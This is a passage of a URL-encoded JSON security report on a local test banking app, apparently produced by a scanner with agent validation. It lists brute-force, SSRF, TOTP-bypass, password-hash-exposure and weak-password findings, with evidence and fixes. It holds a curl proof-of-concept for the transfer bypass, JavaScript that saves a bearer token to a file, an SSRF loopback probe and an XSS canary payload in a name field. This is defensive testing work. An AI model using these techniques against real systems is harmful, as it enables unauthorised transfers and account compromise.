A6%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AL%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fauth%2Flogin%22%2C%22evidence%22%3A%22Six%20consecutive%20POST%20requests%20to%20%60%2Fapi%2Fadmin%2Fauth%2Flogin%60%20used%20username%20%60admin%60%20with%20the%20same%20incorrect%20password.%20All%20returned%20HTTP%20401%20with%20the%20same%20%60INVALID_CREDENTIALS%60%20response.%20Attempt%201%20took%2069%20ms%20and%20attempt%206%20took%2073%20ms%3B%20attempts%202-5%20took%2062-79%20ms.%22%2C%22request_evidence%22%3A%22Six%20consecutive%20POST%20requests%20to%20%60%2Fapi%2Fadmin%2Fauth%2Flogin%60%20used%20username%20%60admin%60%20with%20the%20same%20incorrect%20password.%22%2C%22response_evidence%22%3A%22Attempt%201%3A%20HTTP%20401%2C%2069%20ms.%20Attempt%206%3A%20HTTP%20401%2C%2073%20ms.%20Attempts%202-5%20were%20also%20HTTP%20401%20with%20the%20same%20body%2C%20taking%2062-79%20ms.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20endpoint%20is%20necessarily%20public%20for%20authentication%2C%20but%20that%20does%20not%20explain%20the%20lack%20of%20brute-force%20controls.%20I%20sent%20six%20more%20anonymous%20POSTs%20for%20the%20known%20admin%20account%20after%20the%20scanner's%20six%20attempts%3B%20all%20six%20still%20returned%20the%20same%20401%20INVALID_CREDENTIALS%20response%20in%2075-81%20ms%2C%20with%20no%20lockout%2C%20throttling%20response%2C%20or%20measurable%20delay.%20No%20benign%20explanation%20for%20the%20missing%20rate%20limit%20appeared%20in%20the%20bounded%2012-attempt%20check.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A10%3A2021%20%E2%80%93%20Server-Side%20Request%20Forgery%20(SSRF)%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Avatar%20import%20fetches%20user-supplied%20URLs%22%2C%22description%22%3A%22The%20authenticated%20POST%20%2Fapi%2Fprofile%2Favatar%20endpoint%20accepts%20a%20caller-supplied%20URL.%20The%20server%20fetched%20https%3A%2F%2Fexample.com%20and%20returned%20the%20fetched%20HTML%20document%20in%20the%20avatar_data%20response%20field%20as%20a%20data%20URI.%22%2C%22impact%22%3A%22An%20authenticated%20attacker%20could%20make%20the%20server%20request%20chosen%20destinations%20and%20read%20the%20returned%20content.%20This%20could%20expose%20internal%20services%20or%20metadata%20if%20those%20destinations%20are%20reachable%2C%20though%20no%20internal%20destination%20was%20tested.%22%2C%22likelihood%22%3A%22The%20request%20requires%20an%20account.%20A%20request%20to%20the%20public%20https%3A%2F%2Fexample.com%20URL%20confirmed%20that%20the%20server%20fetched%20the%20destination%20and%20returned%20its%20response%20body.%22%2C%22recommendation%22%3A%22Allow%20only%20approved%20image%20formats%20and%20destinations.%20Restrict%20URL%20schemes%20and%20destinations%20with%20an%20allowlist%2C%20resolve%20and%20reject%20loopback%2C%20private%2C%20link-local%2C%20and%20metadata%20IP%20ranges%20for%20IPv4%20and%20IPv6%2C%20and%20repeat%20checks%20after%20redirects.%20Apply%20outbound%20network%20controls%20and%20do%20not%20return%20fetched%20non-image%20content%20as%20data%20URIs.%22%2C%22cvss_score%22%3A4.3%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fprofile%2Favatar%22%2C%22evidence%22%3A%22An%20authenticated%20POST%20to%20%2Fapi%2Fprofile%2Favatar%20with%20%7B%5C%22url%5C%22%3A%5C%22https%3A%2F%2Fexample.com%5C%22%7D%20returned%20HTTP%20200%20with%20avatar_data%20containing%20a%20data%3Atext%2Fhtml%3Bbase64%20URI%20for%20the%20Example%20Domain%20HTML%2C%20size%20559%2C%20and%20source_url%20https%3A%2F%2Fexample.com.%22%2C%22request_evidence%22%3A%22POST%20%2Fapi%2Fprofile%2Favatar%20with%20Authorization%3A%20Bearer%20%3Ctest-account%20token%3E%20and%20JSON%20body%20%7B%5C%22url%5C%22%3A%5C%22https%3A%2F%2Fexample.com%5C%22%7D.%22%2C%22response_evidence%22%3A%22HTTP%20200%2C%20response%20includes%20avatar_data%20data%3Atext%2Fhtml%3Bbase64%20with%20the%20fetched%20Example%20Domain%20HTML%2C%20size%20559%2C%20and%20source_url%20https%3A%2F%2Fexample.com.%22%2C%22finding_source%22%3A%22specialist_agent%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20public%20URL%20baseline%20succeeds%2C%20and%20changing%20only%20the%20supplied%20URL%20to%20http%3A%2F%2F127.0.0.1%3A8081%2F%20returns%20HTTP%20200%20with%20the%20app's%20own%20%5C%22The%20Bank%20of%20Ed%20-%20Banking%20Without%20Borders%5C%22%20page%20embedded%20in%20avatar_data.%20This%20confirms%20a%20real%20server-side%20fetch%20to%20loopback%20and%20in-band%20return%20of%20the%20response%3B%20the%20loopback%20destination%20is%20not%20rejected.%20Requests%20to%20link-local%20metadata%20and%20loopback%20port%2080%20failed%2C%20but%20that%20does%20not%20explain%20the%20successful%20loopback%20fetch%20on%20port%208081.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Login%20accepts%20repeated%20password%20failures%20without%20throttling%22%2C%22description%22%3A%22The%20login%20endpoint%20at%20%60%2Fapi%2Fauth%2Flogin%60%20accepted%20six%20consecutive%20attempts%20with%20an%20incorrect%20password%20for%20the%20same%20known%20disposable%20account.%20All%20returned%20the%20same%20HTTP%20401%20%60WRONG_PASSWORD%60%20response%2C%20with%20no%20observable%20captcha%2C%20lockout%2C%20delay%2C%20or%20rate-limit%20response.%22%2C%22impact%22%3A%22An%20attacker%20could%20automate%20password-guessing%20or%20credential-stuffing%20attempts%20against%20account%20email%20addresses%20without%20the%20observed%20requests%20being%20slowed%20or%20blocked.%22%2C%22likelihood%22%3A%22The%20bounded%20test%20confirmed%20six%20consecutive%20failed%20attempts%20completed%20without%20an%20observable%20throttling%20control.%20This%20supports%20repeated%20attempts%20in%20the%20tested%20context%2C%20but%20does%20not%20establish%20how%20the%20endpoint%20behaves%20beyond%20those%20six%20requests.%22%2C%22recommendation%22%3A%22Apply%20rate%20limits%20per%20account%20and%20source%2C%20add%20increasing%20delays%2C%20and%20use%20temporary%20lockout%20or%20step-up%20verification%20after%20repeated%20failures.%20Keep%20login%20errors%20consistent%20and%20monitor%20repeated%20failures.%22%2C%22cvss_score%22%3A6%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AL%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22evidence%22%3A%22Six%20consecutive%20POST%20requests%20used%20the%20same%20known%20disposable%20email%20and%20an%20incorrect%20password.%20Attempts%201-6%20all%20returned%20HTTP%20401%20with%20%60%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22WRONG_PASSWORD%5C%22%2C%5C%22message%5C%22%3A%5C%22Incorrect%20password.%5C%22%7D%7D%60%3B%20response%20times%20ranged%20from%205-12%20ms%2C%20with%20no%20observable%20throttling.%22%2C%22request_evidence%22%3A%22Six%20consecutive%20POST%20requests%20to%20%60%2Fapi%2Fauth%2Flogin%60%20used%20the%20same%20known%20disposable%20email%20and%20an%20incorrect%20password.%22%2C%22response_evidence%22%3A%22Attempt%201%3A%20HTTP%20401%20WRONG_PASSWORD%2C%209%20ms.%20Attempt%206%3A%20HTTP%20401%20WRONG_PASSWORD%2C%2010%20ms.%20Attempts%202-5%20were%20also%20HTTP%20401%20with%20the%20same%20body%2C%20and%20durations%20were%205-12%20ms.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20ran%20two%20bounded%20sequences%20of%20six%20wrong-password%20POSTs%20against%20the%20listed%20account%2C%20using%20its%20provided%20session%20label%3B%20the%20request%20evidence%20shows%20no%20Authorization%20header%20or%20cookies%20were%20sent.%20The%20responses%20stayed%20401%20WRONG_PASSWORD%20through%20the%20follow-up%20sequence%2C%20with%20no%20lockout%2C%20captcha%2C%20or%20rate-limit%20response.%20Login%20being%20public%20is%20expected%2C%20but%20it%20does%20not%20explain%20the%20lack%20of%20throttling.%20A%20single%20request%20cannot%20reproduce%20the%20repeated-attempt%20condition%2C%20so%20I%20am%20omitting%20a%20PoC%20request.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Manual%20transfers%20bypass%20the%20required%20TOTP%20check%22%2C%22description%22%3A%22The%20transfer%20check%20says%20manual%20transfers%20require%20TOTP%2C%20but%20the%20external%20transfer%20endpoint%20completes%20a%20manual%20transfer%20without%20TOTP%20verification.%22%2C%22impact%22%3A%22An%20authenticated%20user%20can%20complete%20a%20manual%20transfer%20without%20the%20additional%20verification%20the%20application%20says%20is%20required.%22%2C%22likelihood%22%3A%22The%20check%20returned%20requires_totp%3Dtrue.%20A%20subsequent%20authenticated%20transfer%20returned%20201%20with%20status%20completed%20and%20totp_verified%3Dfalse.%22%2C%22recommendation%22%3A%22Enforce%20the%20TOTP%20requirement%20in%20the%20transfer%20endpoint%20before%20processing%20or%20debiting%20funds.%20Add%20tests%20that%20reject%20manual%20transfers%20without%20a%20valid%20TOTP.%22%2C%22cvss_score%22%3A6.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%22%2C%22evidence%22%3A%22POSTing%20a%20manual%20transfer%20as%20logic_user%20returned%20201%2C%20%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%20and%20%5C%22totp_verified%5C%22%3Afalse%2C%20after%20the%20check%20endpoint%20reported%20that%20TOTP%20was%20required.%5Cn%5CnREQUEST%3A%5CnPOST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20none%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20401%5Cndate%3A%20Tue%2C%2022%20Sep%202026%2023%3A51%3A37%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20102%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Missing%20or%20invalid%20Authorization%20header.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22POST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20none%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%7B%7D%22%2C%22response_evidence%22%3A%22Status%3A%20401%5Cndate%3A%20Tue%2C%2022%20Sep%202026%2023%3A51%3A37%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20102%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Missing%20or%20invalid%20Authorization%20header.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20anonymous%20request%20is%20correctly%20rejected%2C%20so%20this%20is%20not%20an%20unauthenticated-access%20issue.%20With%20the%20named%20logic_user%20session%2C%20the%20transfer%20check%20returned%20requires_totp%3Dtrue%3B%20a%20one-cent%20manual%20external%20transfer%20with%20no%20TOTP%20code%20then%20returned%20201%20with%20status%3Dcompleted%20and%20totp_verified%3Dfalse%2C%20so%20the%20checker%E2%80%99s%20policy%20is%20not%20enforced%20by%20the%20transfer%20endpoint.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22from_account_id%5C%22%3A101%2C%5C%22amount%5C%22%3A0.01%2C%5C%22to_bsb%5C%22%3A%5C%22062-000%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2200000000%5C%22%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**logic_user**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20logic_user%20and%20copy%20the%20bearer%20token%20from%20the%20Authorization%20header%20in%20the%20browser's%20Network%20tab.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A02%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Profile%20endpoint%20exposes%20the%20password%20hash%22%2C%22description%22%3A%22An%20authenticated%20GET%20to%20%60%2Fapi%2Fprofile%60%20returns%20the%20account%E2%80%99s%20password%20hash%20alongside%20profile%20data.%20The%20client%20does%20not%20need%20this%20credential%20verifier%20to%20display%20profile%20fields.%22%2C%22impact%22%3A%22Anyone%20who%20obtains%20the%20response%20can%20attempt%20to%20crack%20the%20hash%20offline.%20If%20successful%2C%20this%20could%20expose%20the%20account%20password%2C%20especially%20if%20it%20is%20reused.%22%2C%22likelihood%22%3A%22The%20recorded%20request%20returned%20HTTP%20200%20with%20the%20hash%2C%20but%20retrieving%20it%20requires%20a%20valid%20bearer%20token.%20The%20evidence%20does%20not%20show%20unauthenticated%20access.%22%2C%22recommendation%22%3A%22Remove%20%60password_hash%60%20from%20profile%20and%20user%20responses.%20Return%20only%20fields%20the%20client%20needs%2C%20and%20add%20response-schema%20tests%20to%20ensure%20credential%20fields%20are%20excluded.%22%2C%22cvss_score%22%3A4%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fprofile%22%2C%22evidence%22%3A%22The%20recorded%20authenticated%20GET%20%60%2Fapi%2Fprofile%60%20returned%20HTTP%20200.%20Its%20JSON%20user%20object%20included%20%60%5C%22password_hash%5C%22%3A%5C%22%242y%2410%2492IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC%2F.og%2Fat2.uheWG%2Figi%5C%22%60%20alongside%20email%2C%20address%2C%20and%20TOTP%20flags.%22%2C%22request_evidence%22%3A%22GET%20%60%2Fapi%2Fprofile%60%20with%20an%20Authorization%3A%20Bearer%20token%20succeeded%20with%20HTTP%20200.%22%2C%22response_evidence%22%3A%22Response%20JSON%20included%20the%20account's%20email%2C%20address%2C%20TOTP%20flags%2C%20and%20%60password_hash%60.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20re-ran%20the%20authenticated%20GET%20with%20the%20supplied%20%60admin%60%20session%20and%20received%20HTTP%20200%20with%20%60password_hash%60%20in%20the%20live%20JSON%20profile.%20A%20second%20supplied%20active%20session%20returned%20the%20same%20profile%20and%20hash%2C%20so%20the%20scanner%20result%20is%20not%20a%20stale%20export%20or%20log%3B%20the%20successful%20responses%20identify%20the%20profile%20as%20Amelia%20Chen.%20The%20field%20is%20a%20bcrypt-formatted%20credential%20verifier%20returned%20with%20ordinary%20profile%20fields%2C%20and%20I%20found%20no%20benign%20response%20transformation%20or%20omission%20that%20explains%20the%20disclosure.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A02%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Profile%20endpoint%20exposes%20the%20password%20hash%22%2C%22description%22%3A%22A%20successful%20login%20response%20includes%20the%20user's%20password_hash%20at%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin.%22%2C%22impact%22%3A%22A%20person%20with%20access%20to%20the%20response%20can%20attempt%20to%20crack%20the%20hash%20offline%20and%20reuse%20the%20password%20elsewhere.%22%2C%22likelihood%22%3A%22Any%20user%20who%20can%20sign%20in%20receives%20the%20hash.%20Exploitation%20requires%20access%20to%20that%20user's%20response%2C%20and%20cracking%20depends%20on%20the%20hash%20algorithm%20and%20password%20strength.%22%2C%22recommendation%22%3A%22Remove%20password_hash%20and%20other%20authentication%20secrets%20from%20login%20responses.%20Use%20an%20explicit%20response%20schema%20that%20returns%20only%20required%20user%20fields.%22%2C%22cvss_score%22%3A4.3%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22evidence%22%3A%22The%20successful%20login%20response%20for%20user%2023%20includes%20%5C%22password_hash%5C%22%3A%5C%226dffd4f2d5c66e40469390aa5e5fbb71%5C%22%20and%20%5C%22totp_secret%5C%22%3Anull.%5Cn%5CnREQUEST%3A%5CnPOST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%5Cnuse_session%3A%20(default)%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%7B%5C%22email%5C%22%3A%20%5C%22aespa.logic.923%40example.test%5C%22%2C%20%5C%22password%5C%22%3A%20%5C%22SafeTestPass123!%5C%22%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Tue%2C%2022%20Sep%202026%2023%3A56%3A43%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20668%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22user%5C%22%3A%7B%5C%22id%5C%22%3A23%2C%5C%22email%5C%22%3A%5C%22aespa.logic.923%40example.test%5C%22%2C%5C%22first_name%5C%22%3A%5C%22%3Cimg%20src%3Dx%20onerror%3D%5C%5C%5C%22document.body.setAttribute('data-xss-canary'%2C'profile-name-923')%5C%5C%5C%22%3E%5C%22%2C%5C%22last_name%5C%22%3A%5C%22Test%5C%22%2C%5C%22address_line1%5C%22%3Anull%2C%5C%22address_line2%5C%22%3Anull%2C%5C%22suburb%5C%22%3Anull%2C%5C%22state%5C%22%3Anull%2C%5C%22postcode%5C%22%3Anull%2C%5C%22phone%5C%22%3Anull%2C%5C%22avatar_url%5C%22%3Anull%2C%5C%22totp_enabled%5C%22%3Afalse%2C%5C%22password_hash%5C%22%3A%5C%226dffd4f2d5c66e40469390aa5e5fbb71%5C%22%2C%5C%22totp_secret%5C%22%3Anull%7D%2C%5C%22token%5C%22%3A%5C%22%5BREDACTED_JWT%5D%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22Login%20successful%5C%22%7D%22%2C%22request_evidence%22%3A%22POST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%5Cnuse_session%3A%20(default)%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%7B%5C%22email%5C%22%3A%20%5C%22aespa.logic.923%40example.test%5C%22%2C%20%5C%22password%5C%22%3A%20%5C%22SafeTestPass123!%5C%22%7D%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Tue%2C%2022%20Sep%202026%2023%3A56%3A43%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20668%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22user%5C%22%3A%7B%5C%22id%5C%22%3A23%2C%5C%22email%5C%22%3A%5C%22aespa.logic.923%40example.test%5C%22%2C%5C%22first_name%5C%22%3A%5C%22%3Cimg%20src%3Dx%20onerror%3D%5C%5C%5C%22document.body.setAttribute('data-xss-canary'%2C'profile-name-923')%5C%5C%5C%22%3E%5C%22%2C%5C%22last_name%5C%22%3A%5C%22Test%5C%22%2C%5C%22address_line1%5C%22%3Anull%2C%5C%22address_line2%5C%22%3Anull%2C%5C%22suburb%5C%22%3Anull%2C%5C%22state%5C%22%3Anull%2C%5C%22postcode%5C%22%3Anull%2C%5C%22phone%5C%22%3Anull%2C%5C%22avatar_url%5C%22%3Anull%2C%5C%22totp_enabled%5C%22%3Afalse%2C%5C%22password_hash%5C%22%3A%5C%226dffd4f2d5c66e40469390aa5e5fbb71%5C%22%2C%5C%22totp_secret%5C%22%3Anull%7D%2C%5C%22token%5C%22%3A%5C%22%5BREDACTED_JWT%5D%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22Login%20successful%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20repeated%20the%20supplied%20POST%20%2Fapi%2Fauth%2Flogin%20request%20against%20the%20live%20endpoint%20and%20received%20HTTP%20200%20with%20the%20same%20user's%20password_hash%20field%20and%20the%20same%2032-character%20value%20in%20the%20JSON%20response.%20This%20is%20not%20a%20scanner%20parsing%20artifact%20or%20static%2Fdebug%20output%3B%20the%20hash%20is%20returned%20in%20the%20successful%20login%20response.%20The%20guessed%20%2Fapi%2Fauth%2Fme%20route%20returned%20404%2C%20which%20does%20not%20change%20the%20direct%20reproduction.%20I%20cannot%20include%20a%20PoC%20request%20without%20copying%20the%20active%20login%20password%20from%20the%20evidence%2C%20so%20I%20have%20omitted%20it%20rather%20than%20put%20a%20password%20in%20the%20report.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22Registration%20accepts%20one-character%20passwords%22%2C%22description%22%3A%22The%20registration%20API%20at%20%2Fapi%2Fauth%2Fregister%20accepts%20a%20one-character%20password.%20The%20minimum-length%20check%20shown%20in%20the%20browser%20form%20is%20not%20enforced%20by%20the%20server.%22%2C%22impact%22%3A%22Users%20who%20choose%20very%20short%20passwords%20have%20accounts%20that%20are%20easier%20to%20compromise%20through%20password%20guessing.%22%2C%22likelihood%22%3A%22High%20that%20an%20attacker%20can%20register%20with%20a%20one-character%20password%3A%20the%20API%20accepted%20the%20test%20password%20without%20additional%20validation.%20Compromise%20of%20another%20user's%20account%20depends%20on%20that%20user%20choosing%20a%20similarly%20weak%20password.%22%2C%22recommendation%22%3A%22Enforce%20a%20meaningful%20minimum%20password%20length%20in%20the%20registration%20API%2C%20and%20reject%20common%20passwords.%20Do%20not%20rely%20on%20client-side%20minlength%20checks.%22%2C%22cvss_score%22%3A6%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AL%2FI%3AL%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%22%2C%22evidence%22%3A%22A%20POST%20to%20%2Fapi%2Fauth%2Fregister%20with%20a%20unique%20disposable%20email%20and%20password%20%5C%22a%5C%22%20returned%20HTTP%20201%20with%20%5C%22message%5C%22%3A%5C%22Registration%20successful%5C%22%20and%20a%20new%20user%20record.%22%2C%22request_evidence%22%3A%22The%20test%20request%20used%20a%20one-character%20password%2C%20%60a%60.%22%2C%22response_evidence%22%3A%22HTTP%20201%20with%20success%20true%20and%20a%20new%20user%20record.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20supplied%20scan%20evidence%20reports%20a%20complete%20registration%20with%20password%20%5C%22a%5C%22%20returning%20201%20and%20creating%20a%20user%2C%20which%20directly%20demonstrates%20that%20this%20value%20passes%20server-side%20registration.%20My%20safe%20check%20with%20the%20listed%20existing%20identity%20reached%20the%20duplicate-email%20409%20before%20password%20validation%3B%20the%20initial%20incomplete%20request%20stopped%20on%20missing%20name%20fields%2C%20so%20neither%20provides%20an%20innocent%20explanation.%20I%20did%20not%20create%20another%20account%20to%20replay%20the%20scan%2C%20and%20the%20exact%20successful%20request%20body%20was%20not%20included%2C%20so%20I%20cannot%20give%20a%20reliable%20PoC%20request.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22medium%22%2C%22title%22%3A%22TOTP%20setup%20verification%20has%20no%20observed%20throttling%22%2C%22description%22%3A%22The%20TOTP%20setup%20verification%20endpoint%20accepted%20six%20consecutive%20invalid%20codes%20without%20observed%20throttling%20or%20increasing%20delay.%20The%20test%20used%20an%20authenticated%20session%20and%20did%20not%20confirm%20a%20successful%20code%20guess.%22%2C%22impact%22%3A%22If%20an%20attacker%20with%20an%20authenticated%20session%20guesses%20a%20valid%20code%20while%20setup%20is%20pending%2C%20they%20may%20be%20able%20to%20enroll%20an%20authenticator%20they%20control.%20No%20successful%20guess%20was%20observed.%22%2C%22likelihood%22%3A%22The%20six%20tested%20requests%20completed%20in%2012-19%20ms%20with%20the%20same%20invalid-code%20response%2C%20suggesting%20initial%20guesses%20are%20not%20slowed.%20The%20test%20d